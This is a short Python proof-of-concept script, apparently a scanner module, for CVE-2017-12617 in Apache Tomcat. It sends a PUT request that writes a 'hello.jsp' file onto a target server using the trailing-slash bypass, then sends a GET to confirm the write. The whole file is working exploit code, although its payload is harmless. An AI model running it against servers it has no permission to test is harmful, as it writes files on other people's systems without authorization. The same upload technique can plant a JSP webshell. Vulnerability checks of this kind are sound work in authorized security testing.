#已测试
#因为原理相同，与CVE_2017_12615共用同一个poc。

import requests
import os
import sys

def upload(url):
    filename = '/hello.jsp'
    data = 'hello'
    try:
        response = requests.put(url + filename + '/', data=data)
        return 1
    except Exception as e:
        print("[-] {0} 连接失败".format(url))
        return 0

def checking(url):
    filename = '/hello.jsp'
    try:
        # 验证文件是否上传成功
        response = requests.get(url + filename)
        if response.status_code == 200 and 'hello' in response.text:
            return ('[+] {0} 存在CVE-2017-12617 Apache Tomcat PUT文件上传漏洞'.format(url))
        else:
            return None
    except Exception as e:
        return None

def check(url, ip ,port):

    if not url:
        url = 'http://' + ip #(测试，添加url后删除)

    target_url = f"{url}:{port}"
    if upload(target_url) == 1:
        return checking(target_url)
    return None